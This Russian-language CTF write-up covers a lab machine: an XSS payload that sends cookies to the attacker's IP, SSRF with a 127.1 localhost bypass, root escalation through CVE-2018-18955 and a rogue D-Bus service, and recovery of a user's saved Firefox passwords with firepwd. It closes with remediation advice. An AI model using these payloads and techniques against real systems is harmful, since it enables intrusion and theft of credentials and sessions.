**Цель:** получить все флаги и разобрать полную цепочку эксплуатации, включая повышение привилегий до root и поиск пароля пользователя `charles`.

## 2. Исследование веб-приложения

На сайте есть возможность **загрузить файл** и **отправить обращение** (форма обратной связи). Первая попытка — внедрить XSS-payload в форму обратной связи:

```html
<script>fetch('http://192.168.182.220/steal?c='+document.cookie)</script>
```

Одновременно — попытка загрузить PHP-shell через форму загрузки. Сервер отвечает:

```
Uploaded file is not an image
```

Попытка обойти проверку через магические байты (полиглот PNG+PHP) — **неудачно**, сервер реально парсит изображение, а не только смотрит первые байты.

В HTML-комментарии на странице галереи обнаружена подсказка от разработчика:

```html
<!--To devs: Make sure that people can also add images using links-->
```

Это указание на то, что где-то есть функционал загрузки изображения **по ссылке** (URL), а не только файлом.

## 3. Фаззинг директорий

```
view_image           (Status: 405) [Size: 178]
```

Обнаружен эндпоинт `/view_image`, который принимает POST с параметром `image_url`. В HTML-форме:

```html
<input type="text" id="image_url" name="image_url" required><br><br>
<input type="submit" value="View Image">
```

При отправке URL сервер вставляет его в атрибут `src`:

```html
<img src="file:///etc/passwd" alt="User provided image">
```

На этом этапе кажется, что это просто отражение URL. Проверка через listener (`192.168.182.220`) показывает, что запросы `GET /test.html` и `GET /header.png` делает **браузер**, а не сервер. То есть `/view_image` с параметром `image_url` — это **client-side** отражение, а не SSRF.

## 4. SSTI в форме обратной связи (не сработало)

Форма `/contact` отправляет POST на `/feedback` с полями `name`, `email`, `message`. Попытка SSTI:

```
Dear {{7*7}},
```

Сервер вернул `{{7*7}}` **как есть**, не вычислив в `49`. Это означает, что шаблонизатор не рендерит пользовательский ввод (или это не Jinja2). SSTI **не сработал**.

## 5. Найден дополнительный эндпоинт и параметр `www`

Фаззинг выявил ещё один эндпоинт:

```
dejaview                [Status: 200, Size: 823, Words: 226, Lines: 33]
```

А для `/view_image` найден **новый параметр**:

```
www                     [Status: 200, Size: 460, Words: 144, Lines: 19]
```

Проверка:

```
www=file:///etc/passwd
```

→ **500 ошибка** (сервер пытается обработать `file://`, но падает).

```
www=http://localhost
```

→ **403 ошибка** (сервер блокирует `localhost`).

Это уже **серверный запрос** — то есть `/view_image` с параметром `www` делает **SSRF**. Подтверждение: при отправке `www=http://192.168.182.220:8000/test.png` в логах listener'а появляется:

```
10.49.145.240 - - [21/Nov/2026 09:40:22] "GET /test.html HTTP/1.1" 404 -
```

Запрос приходит **от сервера** (IP `10.49.145.240`), а не от браузера. **SSRF зарегистрирован.**

## 6. Обход блокировки localhost

Попытка `www=http://127.0.0.1:FUZZ` → **403** (блокируется). Поиск обхода даёт результат через **обфускацию IP**:

```
www=http://127.1:80/
```

Сервер принимает `127.1` (сокращённая форма `127.0.0.1`), и на порту 80 обнаруживается **внутреннее приложение**.

## 9. Повышение привилегий до root (CVE-2018-18955 + dbus)

На машине обнаружено уязвимое ядро Linux (`4.15.0-112-generic`), подверженное **CVE-2018-18955** — уязвимости в механизме пользовательских namespace. Суть: ядро неправильно обрабатывает маппинг UID/GID при вложенных user namespace, что позволяет пользователю без привилегий **записать файлы от имени root** в определённые системные директории.

Эксплойт использует эту уязвимость, чтобы создать вредоносный **D-Bus-сервис**. Механика:

1. **Компиляция**: скрипт `exploit.dbus.sh` компилирует три бинарника — `subuid_shell`, `subshell` и `rootshell` (последний станет root-шеллом).
2. **Создание сервиса**: эксплойт создаёт файл `org.subuid.Service.service` в `/usr/share/dbus-1/system-services/`. В нём прописано, что при запуске сервиса **от имени root** нужно выполнить команду `chown root:root /tmp/sh; chmod u+s /tmp/sh`. То есть сделать `/tmp/sh` SUID-бинарником root.
3. **Обход ограничений**: чтобы записать этот файл в системную директорию, эксплойт использует **CVE-2018-18955** — обходит проверки прав через вложенные user namespace и записывает конфиг **от имени root**.
4. **Активация через dbus**: скрипт вызывает утилиту **`dbus-send`**, чтобы инициировать запуск созданного сервиса. D-Bus видит запрос к сервису, которого ещё нет в памяти, и запускает его **от имени root** (согласно созданному `.service`-файлу). В этот момент выполняется `chmod u+s /tmp/sh`.
5. **Получение шелла**: после этого скрипт запускает `/tmp/sh`, который теперь имеет SUID-бит root. Это даёт root-оболочку.

**Root-флаг получен.**

## 10. Поиск пароля `charles`

Последнее задание — найти пароль пользователя `charles`. В системе найдены два артефакта:

**1. Файл с приватным RSA-ключом** (в кодировке Base64):

```
flag=("LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQ...")
```

После декодирования из Base64 — это PEM-файл **приватного ключа RSA**. Сам по себе он не является флагом, но может быть использован для доступа к чему-либо.

**2. Файл `flag.pyc`** — скомпилированный Python-файл, внутри которого лежит **зашифрованный приватный RSA-ключ**:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,1E462F46CBD271B7BDF835A43324C6D8
...
```

Ключ зашифрован паролем (AES-128-CBC). В конце файла видна строка `tflag(((s/home/beth/flag.py` — вероятно, путь к файлу с флагом или подсказка.

## 11. Обнаружение профиля Firefox пользователя charles

В системе найдена директория:

```
/home/charles/.mozilla/firefox
```

Это профиль Firefox пользователя `charles`. Внутри — файлы, хранящие сохранённые пароли: `key4.db` (ключ шифрования), `logins.json` (зашифрованные логины/пароли), `cert9.db` и другие.

## 12. Расшифровка профиля Firefox

**Попытка 1: `firefox_decrypt.py`**

```bash
python3 firefox_decrypt.py /home/brakka/thm/The\ London\ Bridge/8k3bf3zp.charles/
```

Ошибка:

```
ERROR - Couldn't initialize NSS, maybe '/home/.../8k3bf3zp.charles/' is not a valid profile?
```

Причина — конфликт версий библиотеки **NSS** (Network Security Services). Утилита использует системную `libnss3.so`, которая может быть слишком старой для профиля, созданного в новой версии Firefox. Попытки указать `LD_LIBRARY_PATH` (с правильной директорией, а не файлом) не помогли.

**Попытка 2: `firepwd.py`**

Установлен и запущен альтернативный инструмент `firepwd` от lclevy:

```bash
python3 firepwd.py -d /home/brakka/thm/The\ London\ Bridge/8k3bf3zp.charles/
```

Важно: `firepwd` требует флаг **`-d`** и путь с `/` на конце. После исправления синтаксиса (и `chmod u+x` на директории профиля, чтобы войти в неё) утилита успешно расшифровала `key4.db` и `logins.json`.

**Результат:**

```
https://www.buckinghampalace.com:b'Charles',b'[REDACTED]'
```

**Пароль `charles` найден.**

## Ключевые уязвимости и неправильные конфигурации

1. **SSRF в `/view_image`** через параметр `www` — сервер делает запрос по указанному URL.
2. **Слабая блокировка localhost** — обходится через `127.1` (сокращённая форма).
3. **Приватный SSH-ключ в `.ssh/id_rsa`**, доступный через SSRF.
4. **Уязвимое ядро Linux (CVE-2018-18955)** — позволяет обойти проверки прав через user namespace и записать D-Bus-конфиг от root.
5. **D-Bus-сервис без защиты** — позволяет активировать произвольный сервис от root через `dbus-send`.
6. **Профиль Firefox с сохранёнными паролями** (`key4.db`, `logins.json`), доступный для чтения.
7. **Пароль `charles` хранится в Firefox** и может быть извлечён через `firepwd`.

## Рекомендации по устранению

- Валидировать URL в `/view_image` (разрешать только `http/https`, блокировать внутренние IP на уровне DNS-резолва, а не строки).
- Не хранить приватные SSH-ключи в доступных через веб директориях.
- Обновить ядро Linux (CVE-2018-18955 исправлена в 4.19.2).
- Ограничить D-Bus-сервисы, запретить активацию произвольных сервисов.
- Не хранить пароли в Firefox без мастер-пароля; ограничить доступ к профилю.
- Убрать HTML-комментарии с подсказками из production-кода.
